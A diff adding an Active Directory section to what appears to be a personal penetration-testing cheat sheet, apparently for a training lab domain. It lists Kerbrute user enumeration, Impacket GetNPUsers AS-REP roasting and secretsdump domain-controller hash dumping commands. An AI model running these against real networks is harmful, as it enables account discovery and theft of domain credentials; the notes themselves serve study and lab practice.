@@ -1,6 +1,20 @@
 ## Active Directory
 
+### Kerbrute
+```
+kerbute userenum --dc 10.10.117.125 -d spookysec.local user_list.txt
+```
+### GetNPUsers.py (Impacket)
+```
+python /opt/impacket/examples/GetNPUsers.py -no-pass -usersfile user.txt -dc-ip 10.10.117.125 spookysec.local/
+```
+### Secretsdump.py (Impacket)
+```
+python3 /opt/impacket/examples/secretsdump.py -just-dc <user>@10.10.117.125
+```
 
+<br>
+<br>
 
 ## Binwalk (data extraction)
 
